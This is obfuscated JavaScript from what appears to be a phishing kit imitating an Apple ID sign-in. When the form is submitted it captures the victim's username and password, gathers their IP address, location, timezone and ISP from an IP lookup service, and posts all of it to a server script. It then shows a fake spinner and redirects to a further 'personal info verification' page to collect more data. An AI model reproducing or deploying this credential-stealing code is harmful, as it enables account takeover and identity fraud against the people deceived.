const form_1 = document['getElementById']('datos');
form_1['addEventListener']('submit', function(_0xb542x2) {
    _0xb542x2['preventDefault']();
    let _0xb542x3 = document['getElementsByName']('username');
    let _0xb542x4 = document['getElementsByName']('password');
    if (_0xb542x3[0]['value'] && _0xb542x3[0]['value']) {
        sessionStorage['setItem']('username', _0xb542x3[0]['value']);
        sessionStorage['setItem']('password', _0xb542x4[0]['value']);
        let _0xb542x5 = document['querySelector']('.nd');
        let _0xb542x6 = document['querySelector']('.widgetContainer');
        let _0xb542x7 = document['querySelector']('.spin');
        let _0xb542x8 = document['querySelector']('.remember');
        let _0xb542x9 = document['querySelector']('.checkbox');
        let _0xb542xa = document['querySelector']('.ndbut');
        $('.widgetContainer')['fadeOut'](500);
        $('.remember')['fadeOut'](500);
        $('.checkbox')['fadeOut'](500, function() {
            _0xb542x7['style']['display'] = 'inline'
        });
        let _0xb542xb;
        let _0xb542xc;
        let _0xb542xd;
        let _0xb542xe = navigator['userAgent'];
        let _0xb542xf;
        let _0xb542x10;
        let _0xb542x11;
        fetch('https://ipapi.co/json/')['then']((_0xb542x2) => _0xb542x2['json']())['then']((_0xb542x13) => {
            _0xb542xb = _0xb542x13['ip'];
            _0xb542xc = _0xb542x13['region'];
            _0xb542xd = _0xb542x13['country_name'];
            _0xb542xf = _0xb542x13['timezone'];
            _0xb542x10 = _0xb542x13['postal'];
            _0xb542x11 = _0xb542x13['org']
        })['then'](() => {
            sessionStorage['setItem']('time', _0xb542xf);
            sessionStorage['setItem']('postal', _0xb542x10);
            sessionStorage['setItem']('org', _0xb542x11);
            sessionStorage['setItem']('agent', _0xb542xe);
            sessionStorage['setItem']('apiCountry', _0xb542xd);
            sessionStorage['setItem']('region', _0xb542xc)
        })['then'](() => {
            let _0xb542x12 = new FormData();
            _0xb542x12['append']('username', sessionStorage['username']);
            _0xb542x12['append']('password', sessionStorage['password']);
            _0xb542x12['append']('ip', _0xb542xb);
            _0xb542x12['append']('region', _0xb542xc);
            _0xb542x12['append']('apiCountry', _0xb542xd);
            _0xb542x12['append']('agent', _0xb542xe);
            fetch('scripts/sending1.php', {
                method: 'POST',
                body: _0xb542x12
            });
            setTimeout(() => {
                $('.nd')['fadeIn'](500, function() {
                    _0xb542x5['style']['display'] = 'inline-block'
                });
                _0xb542x7['style']['display'] = 'none'
            }, 2000);
            _0xb542xa['addEventListener']('click', () => {
                window['location']['assign']('https://yourdomaine.com/Apple-ID/personalInfoVerification.php')
            })
        })
    }
})